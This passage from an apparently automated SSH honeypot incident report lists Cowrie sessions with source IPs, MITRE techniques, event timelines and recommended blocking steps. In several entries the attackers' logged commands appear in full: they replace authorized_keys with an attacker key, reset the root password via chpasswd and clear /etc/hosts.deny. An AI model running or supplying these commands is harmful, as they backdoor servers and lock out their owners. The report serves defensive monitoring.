- [ ] Submit `93.48.24[.]181` to AbuseIPDB if not already reported
- [ ] Block `93.48.24[.]181` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd6e3289cb36

| Field | Detail |
|---|---|
| **Source IP** | `14.103.105[.]243` |
| **First Seen** | 2026-04-13 04:34 |
| **Last Seen** | 2026-04-13 04:34 |
| **Session Duration** | 28s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:tlb4WJDija1u"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 04:34:07` | `cowrie.session.connect` |
| `2026-04-13 04:34:07` | `cowrie.client.version` |
| `2026-04-13 04:34:07` | `cowrie.client.kex` |
| `2026-04-13 04:34:09` | `cowrie.login.success` |
| `2026-04-13 04:34:09` | `cowrie.session.params` |
| `2026-04-13 04:34:09` | `cowrie.command.input` |
| `2026-04-13 04:34:09` | `cowrie.command.failed` |
| `2026-04-13 04:34:09` | `cowrie.log.closed` |
| `2026-04-13 04:34:09` | `cowrie.session.params` |
| `2026-04-13 04:34:09` | `cowrie.command.input` |
| `2026-04-13 04:34:10` | `cowrie.session.file_download` |
| `2026-04-13 04:34:10` | `cowrie.log.closed` |
| `2026-04-13 04:34:22` | `cowrie.session.params` |
| `2026-04-13 04:34:22` | `cowrie.command.input` |
| `2026-04-13 04:34:22` | `cowrie.log.closed` |
| `2026-04-13 04:34:22` | `cowrie.session.params` |
| `2026-04-13 04:34:22` | `cowrie.command.input` |
| `2026-04-13 04:34:23` | `cowrie.log.closed` |
| `2026-04-13 04:34:23` | `cowrie.session.params` |
| `2026-04-13 04:34:23` | `cowrie.command.input` |
| `2026-04-13 04:34:23` | `cowrie.session.file_download` |
| `2026-04-13 04:34:23` | `cowrie.log.closed` |
| `2026-04-13 04:34:24` | `cowrie.session.params` |
| `2026-04-13 04:34:24` | `cowrie.command.input` |
| `2026-04-13 04:34:25` | `cowrie.log.closed` |
| `2026-04-13 04:34:25` | `cowrie.session.params` |
| `2026-04-13 04:34:25` | `cowrie.command.input` |
| `2026-04-13 04:34:26` | `cowrie.log.closed` |
| `2026-04-13 04:34:26` | `cowrie.session.params` |
| `2026-04-13 04:34:26` | `cowrie.command.input` |
| `2026-04-13 04:34:26` | `cowrie.command.input` |
| `2026-04-13 04:34:26` | `cowrie.log.closed` |
| `2026-04-13 04:34:27` | `cowrie.session.params` |
| `2026-04-13 04:34:27` | `cowrie.command.input` |
| `2026-04-13 04:34:27` | `cowrie.log.closed` |
| `2026-04-13 04:34:28` | `cowrie.session.params` |
| `2026-04-13 04:34:28` | `cowrie.command.input` |
| `2026-04-13 04:34:28` | `cowrie.log.closed` |
| `2026-04-13 04:34:28` | `cowrie.session.params` |
| `2026-04-13 04:34:28` | `cowrie.command.input` |
| `2026-04-13 04:34:30` | `cowrie.log.closed` |
| `2026-04-13 04:34:30` | `cowrie.session.params` |
| `2026-04-13 04:34:30` | `cowrie.command.input` |
| `2026-04-13 04:34:31` | `cowrie.log.closed` |
| `2026-04-13 04:34:31` | `cowrie.session.params` |
| `2026-04-13 04:34:31` | `cowrie.command.input` |
| `2026-04-13 04:34:31` | `cowrie.log.closed` |
| `2026-04-13 04:34:32` | `cowrie.session.params` |
| `2026-04-13 04:34:32` | `cowrie.command.input` |
| `2026-04-13 04:34:32` | `cowrie.log.closed` |
| `2026-04-13 04:34:32` | `cowrie.session.params` |
| `2026-04-13 04:34:32` | `cowrie.command.input` |
| `2026-04-13 04:34:32` | `cowrie.log.closed` |
| `2026-04-13 04:34:33` | `cowrie.session.params` |
| `2026-04-13 04:34:33` | `cowrie.command.input` |
| `2026-04-13 04:34:33` | `cowrie.log.closed` |
| `2026-04-13 04:34:33` | `cowrie.session.params` |
| `2026-04-13 04:34:33` | `cowrie.command.input` |
| `2026-04-13 04:34:35` | `cowrie.log.closed` |
| `2026-04-13 04:34:35` | `cowrie.session.params` |
| `2026-04-13 04:34:35` | `cowrie.command.input` |
| `2026-04-13 04:34:35` | `cowrie.log.closed` |
| `2026-04-13 04:34:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.105[.]243` to AbuseIPDB if not already reported
- [ ] Block `14.103.105[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2b85ddf153e

| Field | Detail |
|---|---|
| **Source IP** | `43.128.76[.]85` |
| **First Seen** | 2026-04-13 04:34 |
| **Last Seen** | 2026-04-13 04:34 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 04:34:17` | `cowrie.session.connect` |
| `2026-04-13 04:34:17` | `cowrie.client.version` |
| `2026-04-13 04:34:17` | `cowrie.client.kex` |
| `2026-04-13 04:34:17` | `cowrie.login.success` |
| `2026-04-13 04:34:18` | `cowrie.session.params` |
| `2026-04-13 04:34:18` | `cowrie.command.input` |
| `2026-04-13 04:34:18` | `cowrie.command.failed` |
| `2026-04-13 04:34:18` | `cowrie.log.closed` |
| `2026-04-13 04:34:18` | `cowrie.session.params` |
| `2026-04-13 04:34:18` | `cowrie.command.input` |
| `2026-04-13 04:34:18` | `cowrie.session.file_download` |
| `2026-04-13 04:34:18` | `cowrie.log.closed` |
| `2026-04-13 04:34:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.76[.]85` to AbuseIPDB if not already reported
- [ ] Block `43.128.76[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7383ade455d7

| Field | Detail |
|---|---|
| **Source IP** | `43.128.76[.]85` |
| **First Seen** | 2026-04-13 04:34 |
| **Last Seen** | 2026-04-13 04:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 04:34:20` | `cowrie.session.connect` |
| `2026-04-13 04:34:20` | `cowrie.client.version` |
| `2026-04-13 04:34:20` | `cowrie.client.kex` |
| `2026-04-13 04:34:20` | `cowrie.login.success` |
| `2026-04-13 04:34:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.76[.]85` to AbuseIPDB if not already reported
- [ ] Block `43.128.76[.]85` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72f315ea78e5

| Field | Detail |
|---|---|
| **Source IP** | `43.128.76[.]85` |
| **First Seen** | 2026-04-13 04:35 |
| **Last Seen** | 2026-04-13 04:36 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 04:35:58` | `cowrie.session.connect` |
| `2026-04-13 04:35:58` | `cowrie.client.version` |
| `2026-04-13 04:35:58` | `cowrie.client.kex` |
| `2026-04-13 04:35:58` | `cowrie.login.success` |
| `2026-04-13 04:35:58` | `cowrie.session.params` |
| `2026-04-13 04:35:58` | `cowrie.command.input` |
| `2026-04-13 04:35:58` | `cowrie.command.failed` |
| `2026-04-13 04:35:59` | `cowrie.log.closed` |
| `2026-04-13 04:35:59` | `cowrie.session.params` |
| `2026-04-13 04:35:59` | `cowrie.command.input` |
| `2026-04-13 04:35:59` | `cowrie.session.file_download` |
| `2026-04-13 04:35:59` | `cowrie.log.closed` |
| `2026-04-13 04:36:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.76[.]85` to AbuseIPDB if not already reported
- [ ] Block `43.128.76[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b386473598f5

| Field | Detail |
|---|---|
| **Source IP** | `43.128.76[.]85` |
| **First Seen** | 2026-04-13 04:36 |
| **Last Seen** | 2026-04-13 04:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 04:36:00` | `cowrie.session.connect` |
| `2026-04-13 04:36:00` | `cowrie.client.version` |
| `2026-04-13 04:36:00` | `cowrie.client.kex` |
| `2026-04-13 04:36:01` | `cowrie.login.success` |
| `2026-04-13 04:36:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.76[.]85` to AbuseIPDB if not already reported
- [ ] Block `43.128.76[.]85` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a7835c76587

| Field | Detail |
|---|---|
| **Source IP** | `189.217.130[.]86` |
| **First Seen** | 2026-04-13 04:36 |
| **Last Seen** | 2026-04-13 04:36 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 04:36:07` | `cowrie.session.connect` |
| `2026-04-13 04:36:07` | `cowrie.client.version` |
| `2026-04-13 04:36:07` | `cowrie.client.kex` |
| `2026-04-13 04:36:08` | `cowrie.login.success` |
| `2026-04-13 04:36:09` | `cowrie.session.params` |
| `2026-04-13 04:36:09` | `cowrie.command.input` |
| `2026-04-13 04:36:09` | `cowrie.command.failed` |
| `2026-04-13 04:36:09` | `cowrie.log.closed` |
| `2026-04-13 04:36:10` | `cowrie.session.params` |
| `2026-04-13 04:36:10` | `cowrie.command.input` |
| `2026-04-13 04:36:10` | `cowrie.session.file_download` |
| `2026-04-13 04:36:10` | `cowrie.log.closed` |
| `2026-04-13 04:36:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.217.130[.]86` to AbuseIPDB if not already reported
- [ ] Block `189.217.130[.]86` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0692e017488

| Field | Detail |
|---|---|
| **Source IP** | `189.217.130[.]86` |
| **First Seen** | 2026-04-13 04:36 |
| **Last Seen** | 2026-04-13 04:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 04:36:13` | `cowrie.session.connect` |
| `2026-04-13 04:36:13` | `cowrie.client.version` |
| `2026-04-13 04:36:13` | `cowrie.client.kex` |
| `2026-04-13 04:36:14` | `cowrie.login.success` |
| `2026-04-13 04:36:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.217.130[.]86` to AbuseIPDB if not already reported
- [ ] Block `189.217.130[.]86` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1277d288585f

| Field | Detail |
|---|---|
| **Source IP** | `93.48.24[.]181` |
| **First Seen** | 2026-04-13 04:37 |
| **Last Seen** | 2026-04-13 04:37 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 04:37:03` | `cowrie.session.connect` |
| `2026-04-13 04:37:03` | `cowrie.client.version` |
| `2026-04-13 04:37:03` | `cowrie.client.kex` |
| `2026-04-13 04:37:03` | `cowrie.login.success` |
| `2026-04-13 04:37:04` | `cowrie.session.params` |
| `2026-04-13 04:37:04` | `cowrie.command.input` |
| `2026-04-13 04:37:04` | `cowrie.command.failed` |
| `2026-04-13 04:37:04` | `cowrie.log.closed` |
| `2026-04-13 04:37:04` | `cowrie.session.params` |
| `2026-04-13 04:37:04` | `cowrie.command.input` |
| `2026-04-13 04:37:04` | `cowrie.session.file_download` |
| `2026-04-13 04:37:04` | `cowrie.log.closed` |
| `2026-04-13 04:37:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.48.24[.]181` to AbuseIPDB if not already reported
- [ ] Block `93.48.24[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6bc24a707392

| Field | Detail |
|---|---|
| **Source IP** | `93.48.24[.]181` |
| **First Seen** | 2026-04-13 04:37 |
| **Last Seen** | 2026-04-13 04:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 04:37:07` | `cowrie.session.connect` |
| `2026-04-13 04:37:07` | `cowrie.client.version` |
| `2026-04-13 04:37:07` | `cowrie.client.kex` |
| `2026-04-13 04:37:07` | `cowrie.login.success` |
| `2026-04-13 04:37:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.48.24[.]181` to AbuseIPDB if not already reported
- [ ] Block `93.48.24[.]181` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78b0b597b4ac

| Field | Detail |
|---|---|
| **Source IP** | `43.128.76[.]85` |
| **First Seen** | 2026-04-13 04:37 |
| **Last Seen** | 2026-04-13 04:37 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 04:37:41` | `cowrie.session.connect` |
| `2026-04-13 04:37:41` | `cowrie.client.version` |
| `2026-04-13 04:37:41` | `cowrie.client.kex` |
| `2026-04-13 04:37:41` | `cowrie.login.success` |
| `2026-04-13 04:37:41` | `cowrie.session.params` |
| `2026-04-13 04:37:41` | `cowrie.command.input` |
| `2026-04-13 04:37:41` | `cowrie.command.failed` |
| `2026-04-13 04:37:41` | `cowrie.log.closed` |
| `2026-04-13 04:37:41` | `cowrie.session.params` |
| `2026-04-13 04:37:41` | `cowrie.command.input` |
| `2026-04-13 04:37:41` | `cowrie.session.file_download` |
| `2026-04-13 04:37:41` | `cowrie.log.closed` |
| `2026-04-13 04:37:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.76[.]85` to AbuseIPDB if not already reported
- [ ] Block `43.128.76[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2f69bc33ebc

| Field | Detail |
|---|---|
| **Source IP** | `43.128.76[.]85` |
| **First Seen** | 2026-04-13 04:37 |
| **Last Seen** | 2026-04-13 04:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 04:37:43` | `cowrie.session.connect` |
| `2026-04-13 04:37:43` | `cowrie.client.version` |
| `2026-04-13 04:37:43` | `cowrie.client.kex` |
| `2026-04-13 04:37:43` | `cowrie.login.success` |
| `2026-04-13 04:37:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.76[.]85` to AbuseIPDB if not already reported
- [ ] Block `43.128.76[.]85` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ddf2da071d5

| Field | Detail |
|---|---|
| **Source IP** | `93.48.24[.]181` |
| **First Seen** | 2026-04-13 04:37 |
| **Last Seen** | 2026-04-13 04:37 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 04:37:52` | `cowrie.session.connect` |
| `2026-04-13 04:37:52` | `cowrie.client.version` |
| `2026-04-13 04:37:52` | `cowrie.client.kex` |
| `2026-04-13 04:37:53` | `cowrie.login.success` |
| `2026-04-13 04:37:53` | `cowrie.session.params` |
| `2026-04-13 04:37:53` | `cowrie.command.input` |
| `2026-04-13 04:37:53` | `cowrie.command.failed` |
| `2026-04-13 04:37:53` | `cowrie.log.closed` |
| `2026-04-13 04:37:54` | `cowrie.session.params` |
| `2026-04-13 04:37:54` | `cowrie.command.input` |
| `2026-04-13 04:37:54` | `cowrie.session.file_download` |
| `2026-04-13 04:37:54` | `cowrie.log.closed` |
| `2026-04-13 04:37:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.48.24[.]181` to AbuseIPDB if not already reported
- [ ] Block `93.48.24[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe7d9a8ef6b1

| Field | Detail |
|---|---|
| **Source IP** | `93.48.24[.]181` |
| **First Seen** | 2026-04-13 04:37 |
| **Last Seen** | 2026-04-13 04:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 04:37:56` | `cowrie.session.connect` |
| `2026-04-13 04:37:56` | `cowrie.client.version` |
| `2026-04-13 04:37:56` | `cowrie.client.kex` |
| `2026-04-13 04:37:56` | `cowrie.login.success` |
| `2026-04-13 04:37:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.48.24[.]181` to AbuseIPDB if not already reported
- [ ] Block `93.48.24[.]181` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c51b4cc766f9

| Field | Detail |
|---|---|
| **Source IP** | `189.217.130[.]86` |
| **First Seen** | 2026-04-13 04:39 |
| **Last Seen** | 2026-04-13 04:39 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 04:39:11` | `cowrie.session.connect` |
| `2026-04-13 04:39:11` | `cowrie.client.version` |
| `2026-04-13 04:39:11` | `cowrie.client.kex` |
| `2026-04-13 04:39:12` | `cowrie.login.success` |
| `2026-04-13 04:39:13` | `cowrie.session.params` |
| `2026-04-13 04:39:13` | `cowrie.command.input` |
| `2026-04-13 04:39:13` | `cowrie.command.failed` |
| `2026-04-13 04:39:13` | `cowrie.log.closed` |
| `2026-04-13 04:39:14` | `cowrie.session.params` |
| `2026-04-13 04:39:14` | `cowrie.command.input` |
| `2026-04-13 04:39:14` | `cowrie.session.file_download` |
| `2026-04-13 04:39:14` | `cowrie.log.closed` |
| `2026-04-13 04:39:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.217.130[.]86` to AbuseIPDB if not already reported
- [ ] Block `189.217.130[.]86` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
